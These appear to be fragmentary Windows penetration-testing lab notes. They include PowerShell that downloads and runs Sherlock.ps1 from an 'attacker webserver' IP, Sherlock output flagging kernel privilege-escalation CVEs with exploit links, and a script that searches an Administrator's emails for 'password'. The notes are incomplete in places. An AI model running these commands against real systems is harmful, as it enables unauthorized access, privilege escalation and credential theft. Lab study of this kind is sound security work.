
Location of a file

Get-ChildItem -Path C:\ -Include *interesting-file.txt* -File -Recurse -ErrorAction SilentlyContinue

2. Specify the contents of this file

Get-Content "C:\Program Files\interesting-file.txt.txt"


Base64 decode the file b64.txt on Windows. 
__________
#Download from attacker webserver
IEX(New-Object Net.Webclient).downloadString('http://10.10.14.22:8000/Sherlock.ps1')


Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable
___________

$path = 'C:\Users\Administrator\Desktop\emails\*'
$magic_word = 'password'
$exec = Get-ChildItem $path -recurse | Select-String -pattern $magic_word
echo $exec